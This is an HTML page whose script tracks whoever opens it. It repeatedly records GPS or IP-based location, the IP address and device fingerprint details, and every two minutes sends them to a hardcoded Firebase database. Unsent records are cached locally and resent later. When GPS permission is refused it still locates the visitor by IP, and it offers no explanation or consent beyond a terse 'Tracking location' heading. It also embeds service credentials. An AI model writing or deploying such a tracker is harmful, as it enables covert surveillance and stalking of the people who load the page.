<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Persistent Location Tracking</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.firebasestorage.app",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Open IndexedDB for persistent storage
        function openDB() {
            return new Promise((resolve, reject) => {
                let request = indexedDB.open("LocationDB", 1);
                request.onupgradeneeded = (event) => {
                    let db = event.target.result;
                    if (!db.objectStoreNames.contains("unsent_data")) {
                        db.createObjectStore("unsent_data", { autoIncrement: true });
                    }
                };
                request.onsuccess = () => resolve(request.result);
                request.onerror = () => reject("❌ Failed to open IndexedDB");
            });
        }

        // Save unsent data to IndexedDB
        async function cacheUnsentData(data) {
            let db = await openDB();
            let transaction = db.transaction("unsent_data", "readwrite");
            let store = transaction.objectStore("unsent_data");
            store.add(data);
        }

        // Send cached data from IndexedDB
        async function sendCachedData() {
            let db = await openDB();
            let transaction = db.transaction("unsent_data", "readonly");
            let store = transaction.objectStore("unsent_data");
            let request = store.getAll();

            request.onsuccess = async () => {
                let unsentData = request.result;
                if (unsentData.length > 0) {
                    console.log(`📤 Sending ${unsentData.length} cached entries...`);
                    for (const data of unsentData) {
                        try {
                            await addDoc(collection(db, "user_data"), data);
                        } catch (error) {
                            console.error("❌ Failed to send cached data:", error);
                            return;
                        }
                    }
                    let clearTransaction = db.transaction("unsent_data", "readwrite");
                    let clearStore = clearTransaction.objectStore("unsent_data");
                    clearStore.clear();
                    console.log("✅ All cached data sent successfully!");
                }
            };
        }

        // Get Device Info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Fetch IP Address
        function getIPAddress(callback) {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(() => callback("Unknown"));
        }

        // Get GPS or IP location with IP Address
        function getGPSLocation(callback) {
            getIPAddress((ip) => {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => callback({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            ip: ip,
                            type: "GPS"
                        }),
                        () => getIPLocation(ip, callback),
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    getIPLocation(ip, callback);
                }
            });
        }

        function getIPLocation(ip, callback) {
            fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                .then(response => response.json())
                .then(data => callback({
                    latitude: data.loc.split(",")[0],
                    longitude: data.loc.split(",")[1],
                    city: data.city,
                    country: data.country,
                    ip: ip,
                    accuracy: "Estimated via IP",
                    type: "IP"
                }))
                .catch(() => callback(null));
        }

        // Save data to Firestore or cache in IndexedDB
        async function saveUserData(location) {
            const userInfo = {
                location: location || "Unknown",
                device: getDeviceInfo(),
                timestamp: new Date().toISOString()
            };

            try {
                await addDoc(collection(db, "user_data"), userInfo);
                console.log("✅ Data sent to Firebase:", userInfo);
            } catch (error) {
                console.error("❌ Firebase error, saving to cache:", error);
                await cacheUnsentData(userInfo);
            }
        }

        // Periodic Data Collection
        function startDataCollection() {
            function collectAndSave() {
                getGPSLocation((location) => saveUserData(location));
            }
            collectAndSave();
            setInterval(collectAndSave, 120000); // Every 2 minutes
        }

        // Sync cached data when online
        window.addEventListener("online", sendCachedData);

        // Start tracking
        startDataCollection();
        sendCachedData();
    </script>
</head>
<body>
    <h2>Tracking location and storing data...001</h2>
</body>
</html>
